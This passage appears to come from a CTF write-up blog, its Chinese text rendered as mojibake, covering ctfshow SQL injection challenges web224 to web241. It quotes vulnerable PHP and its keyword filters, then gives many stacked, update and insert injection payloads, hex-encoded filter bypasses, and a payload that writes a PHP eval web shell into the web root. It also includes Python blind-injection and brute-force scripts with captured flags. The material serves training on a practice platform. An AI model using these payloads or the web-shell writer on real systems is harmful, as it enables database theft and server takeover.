class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">  <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†å¾ˆå¤šæ–‡ä»¶ç±»å‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹åœ¨è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„è¯­å¥æ”¾è¿›å»åä¼šé—­åˆå‰é¢çš„æ‹¬å·ï¼Œç„¶åå †å æ³¨å…¥å†™æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;filename&#x27;,&#x27;filepath&#x27;,&#x27;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;    </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆçœ‹ä¸‹<a href="https://blog.csdn.net/miuzzx/article/details/104465584">å †å æ³¨å…¥å¼•å‘çš„æ€è€ƒ</a>å’Œ<a href="https://blog.csdn.net/solitudi/article/details/107823398">SQLæ³¨å…¥éšä¾¿æ³¨(ä¸‰ç§å§¿åŠ¿)</a>å­¦ä¹ ä¸‹</p><h3 id="æ–¹æ³•ä¸€-Handler"><a href="#æ–¹æ³•ä¸€-Handler" class="headerlink" title="æ–¹æ³•ä¸€ Handler"></a>æ–¹æ³•ä¸€ Handler</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ctfshow_flagasa</span><br><span class="line">/api/?username=1&#x27;;show tables;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># flagas</span><br><span class="line">/api/?username=1&#x27;;show columns from ctfshow_flagasa;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?username=1&#x27;;HANDLER ctfshow_flagasa OPEN as aaa;HANDLER aaa READ FIRST;&amp;page=1&amp;limit=10</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagas&quot;:&quot;ctfshow&#123;bc3f1bc6-6ec5-4590-9362-f7610702c891&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ-é¢„å¤„ç†"><a href="#æ–¹æ³•äºŒ-é¢„å¤„ç†" class="headerlink" title="æ–¹æ³•äºŒ é¢„å¤„ç†"></a>æ–¹æ³•äºŒ é¢„å¤„ç†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ctfshow_web</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; database()&#x27;);EXECUTE evo1;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; flagas from ctfshow_flagasa&#x27;);EXECUTE evo1;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from concat(char(115,101,108,101,99,116), &#x27; flagas from ctfshow_flagasa&#x27;);EXECUTE evo1;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è½¬æˆåå…­è¿›åˆ¶ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select database()</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c6563742064617461626173652829;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># show tables</span><br><span class="line"># ctfsh_ow_flagas</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73686f77207461626c6573;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># select * from ctfsh_ow_flagas</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagasb&quot;:&quot;ctfshow&#123;dc7176dd-fba9-4665-aebb-7f4c0d2c2cf7&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>è¿™é“é¢˜ç”¨å‰é¢çš„æ–¹æ³•æ‰¾ä¸åˆ°ï¼Œä¼ ä¸ªğŸä¸Šå»çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c65637420273c3f706870206576616c28245f504f53545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f312e70687027;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>è¿æ¥æ•°æ®åº“è®°å¾—æ•°æ®åº“ç±»å‹è¦é€‰<code>MYSQLI</code>ï¼Œåœ¨<code>ROUTINES</code>å‘ç°<code>getFlag</code>æ–¹æ³•</p><p><img src="https://cdnjson.com/images/2023/02/08/web227.png" alt="web227.png"></p><p>å‘å³ç¿»æ‰¾åœ¨å®šä¹‰å¤„å¯ä»¥æ‰¾åˆ°<code>flag</code></p><p><img src="https://cdnjson.com/images/2023/02/08/web227-flag.png" alt="web227-flag.png"></p><p>çŸ¥é“åœ°æ–¹åå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥æ³¨å…¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from information_schema.routines</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨<code>getFlag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;call getFlag;</span><br></pre></td></tr></table></figure><h2 id="web228-230"><a href="#web228-230" class="headerlink" title="web228-230"></a>web228-230</h2><p>åŒ<code>web226</code></p><h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>update</code>æ³¨å…¥ï¼Œè®°å¾—æ”¹ç”¨<code>post</code>æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># root@localhost</span><br><span class="line">password=1&#x27;,username=user() where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># ctfshow_web</span><br><span class="line">password=1&#x27;,username=database() where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># banlist,ctfshow_user,flaga</span><br><span class="line">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># id,flagas,info</span><br><span class="line">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&quot;flaga&quot;) where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;29f08a27-226c-4e94-9689-ea06e7c9cd83&#125;</span><br><span class="line">password=1&#x27;,username=(select flagas from flaga) where id=1#&amp;username=1</span><br></pre></td></tr></table></figure><h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>æ”¹æˆç”¨<code>&#39;)</code>é—­åˆå³å¯ï¼Œå…¶ä»–æ­¥éª¤åŒ<code>web231</code></p><h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨<code>\</code>é€ƒé€¸ï¼Œä¼šæŠŠç¬¬ä¸€ä¸ª<code>&#39;</code>æ³¨é‡Šæ‰ï¼Œå˜æˆä¸‹é¢è¿™ç§è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;,username=(select database()) where id=1&#x27;;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag233333</span><br><span class="line">username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flagass233,info</span><br><span class="line">username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag233333&#x27;) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;55536d6e-1dc6-47dc-9a53-51b709ea4c64&#125;</span><br><span class="line">username=,username=(select flagass233 from flag233333) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f920bbce-de8e-4f5a-81e6-2e859b158cad.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#è¡¨å banlist,ctfshow_user,flag233333 </span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#åˆ—å id,flagass233,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ctfshow&#123;55536d6e-1dc6-47dc-9a53-51b709ea4c64&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;ascii(substr((select group_concat(flagass233)from flag233333),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;1&#x27; or if((<span class="subst">&#123;payload&#125;</span>),sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œç›´æ¥ç”¨<code>\</code>é€ƒé€¸å°±å¥½(æ‰¾åˆ—åå“ªé‡Œè¡¨åå¯ä»¥è½¬16è¿›åˆ¶æˆ–è€…ç”¨<code>&quot;</code>åŒ…è£¹)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag23a</span><br><span class="line">username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flagass23s3,info</span><br><span class="line">username=,username=(select group_concat(column_name)from information_schema.columns where table_name=0x666C6167323361) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&quot;flag23a&quot;) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;adc42c34-0200-452a-b04c-dc465c05ecb2&#125;</span><br><span class="line">username=,username=(select flagass23s3 from flag23a) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure><h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>ç¦ç”¨äº†<code>or</code>ï¼Œæ— æ³•ç”¨<code>information_schema</code>ï¼Œæ¢åˆ«çš„åº“ï¼Œç„¶åæ— æ³•è·å–åˆ—åï¼Œä½¿ç”¨<a href="https://zhuanlan.zhihu.com/p/98206699">æ— åˆ—åæ³¨å…¥</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag23a1,gtid_slave_pos</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;8dc6b582-bb1f-4700-8a60-59a2c552877c&#125;</span><br><span class="line">username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select b from(select 1,2 as b,3 union select * from flag23a1 limit 1,1)a) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure><h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><p>å¢åŠ è¿‡æ»¤äº†<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flaga,gtid_slave_pos</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;975ab439-77ff-42fd-87be-84a13f913594&#125;</span><br><span class="line">username=,username=(select `2` from(select 1,2,3 union select * from flaga limit 1,1)a) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select b from(select 1,2 as b,3 union select * from flaga limit 1,1)a) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select to_base64(b) from(select 1,2 as b,3 union select * from flaga limit 1,1)a) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure><h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>insert</code>æ³¨å…¥ï¼Œé—­åˆå‰é¢çš„<code>&#39;</code>ç„¶åæ’å…¥è‡ªå·±çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into ctfshow_user(username,pass) value(&#x27;1&#x27;,(select database());#&#x27;,&#x27;1&#x27;);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code>(åœ¨<code>/api/insert.php</code>é¡µé¢)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=1&#x27;,(select database()));#&amp;password=1</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag,gtid_slave_pos</span><br><span class="line">username=1&#x27;,(select group_concat(table_name) from mysql.innodb_table_stats));#&amp;password=1</span><br><span class="line"># banlist,ctfshow_user,flag</span><br><span class="line">username=1&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#&amp;password=1</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flagass23s3,info</span><br><span class="line">username=1&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;));#&amp;password=1</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;0cdc4293-2484-435d-9961-4f932090a6a2&#125;</span><br><span class="line">username=1&#x27;,(select b from(select 1,2 as b,3 union select * from flag limit 1,1)a));#&amp;password=1</span><br><span class="line">username=1&#x27;,(select flagass23s3 from flag));#&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>è¿‡æ»¤äº†<code>ç©ºæ ¼</code>ç­‰ï¼Œç”¨æ‹¬å·ç»•è¿‡å°±å¥½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=1&#x27;,(select(database())))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># banlist,ctfshow_user,flagb</span><br><span class="line">username=1&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flag,info</span><br><span class="line">username=1&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;flagb&quot;)))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;c24af03f-76a7-4531-bfcc-fad472993e2b&#125;</span><br><span class="line">username=1&#x27;,(select(flag)from(flagb)))#&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šåˆè¿‡æ»¤äº†<code>or</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=1&#x27;,(select(database())))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># banlist,ctfshow_user,flagbb,gtid_slave_pos</span><br><span class="line">username=1&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># æ— åˆ—åæ²¡è¯•å‡ºæ¥ï¼ŒçŒœæµ‹åˆ—åä¸ºflag</span><br><span class="line"># ctfshow&#123;924a10ce-aa48-40cf-8805-0cd3c1ad8b41&#125;</span><br><span class="line">username=1&#x27;,(select(flag)from(flagbb)))#&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>å¼€å±€ç»™äº†æç¤º</p><blockquote><p>Hint: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a&#x2F;bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™</p></blockquote><p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šåˆç¦ç”¨äº†<code>mysql</code>ï¼Œçˆ†ç ´ä¸€ä¸‹å°±å¥½</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url_insert = <span class="string">&quot;http://472ad1c9-07cb-4687-8a5b-6d471cc8fb34.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line">url_query = <span class="string">&quot;http://472ad1c9-07cb-4687-8a5b-6d471cc8fb34.challenge.ctf.show/api/?page=1&amp;limit=1000&quot;</span></span><br><span class="line">letters = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letters:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letters:  </span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letters:  </span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> letters:</span><br><span class="line">                    table_name = <span class="string">&#x27;flag&#x27;</span> + i + j + k + l + m</span><br><span class="line">                    data = &#123;</span><br><span class="line">                        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;1&#x27;,(select(flag)from(<span class="subst">&#123;table_name&#125;</span>)))#&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    r_insert = requests.post(url=url_insert,data=data)</span><br><span class="line">                    r_query = requests.get(url=url_query)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> r_query.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> i[<span class="string">&#x27;pass&#x27;</span>]:</span><br><span class="line">                            <span class="built_in">print</span>(i[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">                            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f9c649bd-f226-4838-9cc6-b550d590337b.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span 